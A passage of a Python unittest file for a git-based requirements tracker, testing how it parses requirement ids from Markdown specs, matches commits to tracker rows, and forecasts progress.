        sha = self.commit("2026-03-10", "row 1", committer="2026-03-10", files={"r.py": "1\n"}, table=False)
        self.set_row(1, "Live")
        self.write_table()
        self.note(1, f"`{sha}`")
        self.commit("2026-03-09", "row 1 live", table=False)
        self.assertEqual(self.judged()["row 1"]["class"], focus.ON)

    def test_the_matrix_as_json_goes_where_it_is_told(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        done = self.engine("matrix", "--json", "--offline", "--out", "m.json")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("rows", json.loads((self.repo / "m.json").read_text()))


class TheEighthReader(Case):
    """A reader who checked the seventh's fixes in ordinary use: A1 to A4, and what was cheap beside them. Most of it is a new rule reaching too far."""

    named, set_row, found, judged, merge_commit = TheFourthAttack.named, TheFourthAttack.set_row, TheFourthAttack.found, TheFourthAttack.judged, TheFourthAttack.merge_commit
    note, coverage = TheSeventhReader.note, TheSeventhReader.coverage

    def parsed(self, text):
        return [(item.ident, item.words) for item in requirements.parse(text, "spec.md")]

    # A1: a word in a heading is not a section
    def test_a1_a_title_with_such_a_word_loses_nothing(self):
        for title in ("# Risk Dashboard: Product Requirements", "# Product Requirements, Revision 3", "# Requirements and Assumptions", "# Reference Manager: Requirements", "# Customer Decision Hub PRD", "## Requirements and assumptions", "## Appendix A: Requirements"):
            with self.subTest(title):
                self.assertEqual(self.parsed(f"{title}\n\n- REQ-1: Users sign in\n- REQ-2: Admins invite\n"), [("REQ-1", "Users sign in"), ("REQ-2", "Admins invite")])

    def test_a1_a_feature_with_such_a_name_loses_nothing(self):
        text = "".join(f"### {heading}\n- FR-{at}: Words {at}\n" for at, heading in enumerate(("Applications", "Risk scoring", "Decision support", "Reference data", "Question editor", "Revision history", "Change log viewer"), 1))
        self.assertEqual([item.ident for item in requirements.parse(text, "spec.md")], [f"FR-{at}" for at in range(1, 8)])

    def test_a1_nor_does_a_to_do_list(self):
        self.assertEqual(self.parsed("# TODO\n\n## Sign-up\n- [ ] Password reset\n\n## Question bank\n- [ ] Add a question\n"), [(None, "Password reset"), (None, "Add a question")])

    def test_a1_a_section_that_is_one_keeps_only_what_the_file_defines(self):
        text = "## Requirements\n\n- FR-1: Sign in\n\n## Risks\n\n- R-1: Data loss\n- FR-2: Written here\n- [ ] A plain item\n"
        self.assertEqual(self.parsed(text), [("FR-1", "Sign in"), ("FR-2", "Written here")])

    def test_a1_numbered_and_qualified_headings_are_the_same_section(self):
        for heading in ("## 7. Risks", "## 7.1 Open questions", "## Known risks", "## Risks and mitigations", "## Assumptions and dependencies", "## **Glossary**", "## Goals:"):
            with self.subTest(heading):
                self.assertEqual(self.parsed(f"- FR-1: Sign in\n\n{heading}\n\n- Q-1: A thing\n"), [("FR-1", "Sign in")])

    # A2: what was passed over, and why, where it is seen
    def test_a2_the_matrix_lists_each_with_its_reason(self):
        self.named("Sign in", "Thing")
        self.write_table()
        found = self.coverage("# Spec\n\n## Open questions\n- [ ] Who signs off on pricing?\n- Q-1: Do we support IMAP?\n\n## Requirements\n- REQ-1: Sign in\n\n| Interface | Protocol |\n|---|---|\n| IF-1 | REST |\n\n| Area | Ticket |\n|---|---|\n| Billing | ENG-1 |\n")
        self.assertEqual([(item.ident, item.line) for item in found["passed_over"]], [(None, 4), ("Q-1", 5), ("IF-1", 12), ("ENG-1", 16)])
        words = trace.markdown(self.plan(), offline=True)
        self.assertIn("4 lines of the spec were not read as requirements", words)
        self.assertIn("## Not read as requirements", words)
        self.assertIn("| Who signs off on pricing? | spec.md:4 | it stands under a heading that does not hold requirements", words)
        self.assertIn("| IF-1 | spec.md:12 | its table does not say it holds requirements", words)
        self.assertIn("| ENG-1 | spec.md:16 | its column does not say it holds ids", words)

    def test_a2_init_says_so(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("- FR-1: Sign in\n\n| Code | Meaning |\n|---|---|\n| ERR-1 | Unknown |\n")
        done = self.engine("init", "--from-checklist", "spec.md")
        self.assertEqual(done.returncode, 0)
        self.assertIn("Passed over 1 line that may not be requirements, the first ERR-1 at spec.md:5", done.stderr)

    def test_a2_doctor_says_so_and_stays_ok(self):
        self.named("Sign in")
        self.write_table()
        self.coverage("- FR-1: Sign in\n\n| Code | Meaning |\n|---|---|\n| ERR-1 | Unknown |\n")
        self.note(1, "FR-1")
        self.engine("render", "--write")
        self.commit("2026-03-01", "start", table=False)
        done = self.engine("doctor", "--offline")
        self.assertIn("1 line passed over, which `matrix` lists", done.stdout)
        self.assertNotIn("! scope", done.stdout)

    # A3: a table that says it holds requirements
    def test_a3_it_holds_them_whatever_its_first_column_is_called(self):
        for name, text, wanted in (
            ("a plain list beside it", "- FR-1: Browse\n\n| NFR | Requirement | Target |\n|---|---|---|\n| NFR-1 | Page load | under 2 s |\n", [("FR-1", "Browse"), ("NFR-1", "Page load")]),
            ("another table beside it", "| ID | Requirement |\n|---|---|\n| R-1 | One |\n\n| Code | Requirement |\n|---|---|\n| C-1 | Two |\n", [("R-1", "One"), ("C-1", "Two")]),
            ("stories under epics", "## EPIC-1 Checkout\n\n| Key | Summary |\n|---|---|\n| CK-1 | Pay by card |\n", [("EPIC-1", "Checkout"), ("CK-1", "Pay by card")]),
            ("a goal beside it", "## Goals\nG-1: Cut no-shows.\n\n## Requirements\n\n| Code | Requirement | Owner |\n|---|---|---|\n| CS-1 | Patients book online | Ana |\n", [("CS-1", "Patients book online")]),
        ):
            with self.subTest(name):
                self.assertEqual(self.parsed(text), wanted)

    def test_a3_an_error_table_with_a_description_does_not_say_so(self):
        self.assertEqual(self.parsed("- FR-1: Browse\n\n| Code | Description |\n|---|---|\n| ERR-1 | Unknown parcel |\n"), [("FR-1", "Browse")])

    # What no reader wrote and this machine's own specs do
    def test_a_title_in_bold_with_its_id(self):
        text = ("## Functional requirements\n\n- **FR-1 Intake.** Accept raw mileage and fuel files.\n- **FR-2** `recall` returns raw evidence.\n\n## Non-functional requirements\n\n"
                "- **NFR-1 Local-first / free by default.** Inference runs on local models.\n**NFR-2 On its own line:** words\n")
        self.assertEqual(self.parsed(text), [("FR-1", "Intake"), ("FR-2", "`recall` returns raw evidence."), ("NFR-1", "Local-first / free by default"), ("NFR-2", "On its own line")])

    def test_a_fresh_start_names_the_row_by_that_title(self):
        self.plan_path.unlink()
        (self.repo / "requirements.md").write_text("# Spec\n\n## Functional\n\n- **FR-1 Intake.** Accept raw files.\n- **FR-2 Normalize.** Parse them.\n\n## Quality\n\n- **NFR-1 Privacy.** Stays local.\n")
        self.assertEqual(self.engine("init", "--from-checklist", "requirements.md").returncode, 0)
        self.assertEqual([r.name for d in tables.load_clean(self.plan()).domains for r in d.rows], ["Intake", "Normalize", "Privacy"])

    # A4: a branch that lives on
    def test_a4_a_row_citing_develop_says_nothing_of_what_else_is_on_it(self):
        self.named("Reports page", "Billing")
        self.write_table()
        self.commit("2026-03-01", "tracker")
        git(self.repo, "checkout", "-q", "-b", "develop")
        self.commit("2026-03-02", "Add CSV contact import", files={"c.py": "1\n"}, table=False)
        self.note(1, "*(Partial 2026-03-03: branch `develop`)*")
        self.commit("2026-03-03", "tracker: reports on develop", table=False)
        self.commit("2026-03-04", "Add the embeddable chat widget", files={"w.py": "1\n"}, table=False)
        self.assertEqual(self.judged()["Add the embeddable chat widget"]["class"], focus.OFF)
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("develop", day="2026-03-05", message="Merge branch 'develop'")
        self.assertEqual(self.judged()["Add CSV contact import"]["class"], focus.OFF)

    # W1 to W9: what was cheap beside them
    def test_a_note_written_by_hand_says_which_it_implements(self):
        for note, ids in (("Implements REQ-1", ["REQ-1"]), ("`REQ-2`", ["REQ-2"]), ("**REQ-3**", ["REQ-3"]), ("(REQ-4)", ["REQ-4"]), ("[REQ-6] started", ["REQ-6"]), ("Spec: REQ-9", ["REQ-9"]), ("REQ-7 and REQ-8", ["REQ-7", "REQ-8"]), ("covers FR-1, FR-2", ["FR-1", "FR-2"]),
                          ("depends on REQ-3", []), ("see REQ-1", []), ("blocked by REQ-2", [])):
            with self.subTest(note):
                self.assertEqual(evidence.requirements_held("A row", note), ids)

    def test_a_standard_in_a_row_s_name_is_not_a_requirement(self):
        self.assertEqual(evidence.requirements_held("UTF-8 attachment names and SHA-256 checksums", ""), [])
        self.assertEqual(evidence.requirements_held("Login (REQ-1)", ""), ["REQ-1"])

    def test_a_tag_from_before_the_table_is_not_pace_either(self):
        self.named("One", "Two", "Three", "Four", "Five")
        self.commit("2026-01-05", "old work", files={"old.py": "1\n"}, table=False)
        git(self.repo, "tag", "v0.1")
        self.write_table()
        self.commit("2026-02-01", "the tracker")
        for num, day in enumerate(("2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.set_row(num, "Live")
            self.write_table()
            for n in range(1, num + 1):
                self.note(n, "tag v0.1")
            self.commit(day, f"row {num} was done", table=False)
        found = self.data()
        self.assertEqual((found["moving_days"], found["set_aside"]), (0, 3))
        self.assertIn("3 rows moved on the table's first day, or on commits from before it", forecast.text(found))

    def test_an_issue_needs_a_word_or_parentheses_and_a_note_that_starts_with_it(self):
        self.named("Invoice PDF export", "Mail digest", "Site theme")
        self.write_table()
        self.note(1, "issue #12")
        self.note(2, "blocked by issue #40")
        self.note(3, "issue #333")
        self.commit("2026-03-01", "tracker", table=False)
        self.commit("2026-03-02", "Work around rails/rails#12 in the mailer", files={"m.py": "1\n"}, table=False)
        self.commit("2026-03-03", "Stop the crash on empty carts (closes #40)", files={"c.py": "1\n"}, table=False)
        self.commit("2026-03-04", "Darken the header to #333", files={"s.css": "1\n"}, table=False)
        self.commit("2026-03-05", "Renderer, see #12", files={"r.py": "1\n"}, table=False)
        self.commit("2026-03-06", "Renderer tweak (#12)", files={"q.py": "1\n"}, table=False)
        found = self.judged()
        for subject in ("Work around rails/rails#12 in the mailer", "Stop the crash on empty carts (closes #40)", "Darken the header to #333"):
            self.assertEqual(found[subject]["class"], focus.OFF, subject)
        self.assertEqual((found["Renderer, see #12"]["rows"], found["Renderer tweak (#12)"]["rows"]), ([1], [1]))

    def test_a_row_finished_is_finished_by_its_issue_too(self):
        self.named("Invoice PDF export", "Billing")
        self.set_row(1, "Live")
        self.write_table()
        self.note(1, "issue #12")
        self.commit("2026-03-01", "tracker", table=False)
        self.commit("2026-03-05", "Tidy the invoice totals, see #12", files={"t.py": "1\n"}, table=False)
        self.assertEqual(self.judged()["Tidy the invoice totals, see #12"]["class"], focus.UNCLEAR)

    def test_the_first_day_is_not_in_the_days_either(self):
        self.write_table()
        self.commit("2026-02-20", "tracker")
        for num, day in enumerate(("2026-02-21", "2026-02-23", "2026-02-25"), start=1):
            self.move(num, "Partial", day)
        pace = forecast.read_pace(self.plan(), today=datetime.date(2026, 2, 25))
        self.assertEqual(pace.days, 5)

    def test_a_table_of_today_has_a_day_to_divide_by(self):
        self.write_table()
        self.commit("2026-02-20", "tracker")
        self.assertEqual(forecast.read_pace(self.plan(), today=datetime.date(2026, 2, 20)).days, 1)
        self.assertEqual(forecast.data(self.plan(), today=datetime.date(2026, 2, 20))["state"], "too_little")

    def test_a_row_that_finished_on_the_first_day_had_not_finished_before_it(self):
        self.named("Login", "Export")
        self.write_table()
        self.commit("2026-03-01", "start")
        sha = self.commit("2026-03-01", "row 1: session cookie", files={"a.py": "1\n"}, table=False)
        self.set_row(1, "Live")
        self.write_table()
        self.note(1, f"`{sha}`")
        self.commit("2026-03-01", "row 1 live", table=False)
        self.assertEqual(self.judged()["row 1: session cookie"]["class"], focus.ON)

    def test_a_feature_named_upgrade_or_fixed_is_not_upkeep(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        for at, subject in enumerate(("Upgrade prompt for free users", "Upgrade flow: pick a plan and pay", "Fixed-price quotes", "Fixed header on the pricing table"), 2):
            self.commit(f"2026-03-{at:02d}", subject, files={f"{at}.py": "1\n"}, table=False)
        self.commit("2026-03-09", "Upgrade Spring Boot to 3.3", files={"u.py": "1\n"}, table=False)
        self.commit("2026-03-10", "Fix login redirect loop", files={"f.py": "1\n"}, table=False)
        found = self.judged()
        for subject in ("Upgrade prompt for free users", "Upgrade flow: pick a plan and pay", "Fixed-price quotes", "Fixed header on the pricing table"):
            self.assertEqual(found[subject]["class"], focus.OFF, subject)
        self.assertEqual((found["Upgrade Spring Boot to 3.3"]["class"], found["Fix login redirect loop"]["class"]), (focus.UPKEEP, focus.UPKEEP))

    def test_a_line_that_could_be_prose_is_said_too(self):
        passed = requirements.passed_over_in("- FR-1: Write a note\n- NFR-1 Sync finishes within five seconds\n", "spec.md")
        self.assertEqual([(item.ident, item.why) for item in passed], [("NFR-1", requirements.WHY_NOT_READ["prose"])])

    def test_a_package_called_gradle_is_not_a_project_file(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        self.commit("2026-03-02", "A plugin", files={"org/acme/gradle/Plugin.java": "1\n"}, table=False)
        self.assertEqual(self.judged()["A plugin"]["class"], focus.OFF)

    def test_json_goes_where_it_is_told(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        for command, keys in ((("report",), ()), (("chart",), ()), (("chart", "--burndown"), ("points",))):
            with self.subTest(command):
                done = self.engine(*command, "--json", "--out", "x.json")
                self.assertEqual(done.returncode, 0, done.stderr)
                found = json.loads((self.repo / "x.json").read_text())
                for key in keys:
                    self.assertIn(key, found)


if __name__ == "__main__":
    unittest.main()
